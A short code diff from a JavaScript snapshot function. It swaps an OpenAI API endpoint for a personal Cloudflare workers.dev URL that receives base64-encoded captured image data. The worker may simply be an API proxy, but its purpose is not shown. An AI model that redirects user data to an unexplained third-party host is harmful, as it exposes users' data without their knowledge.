@@ -539,7 +539,7 @@ async function doSnap() {
 
   try {
     const base64 = dataUrl.split(',')[1];
-    const resp = await fetch('https://api.openai.com/v1/chat/completions', {
+    const resp = await fetch('https://twilight-sky-563c.terlikaa.workers.dev/', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
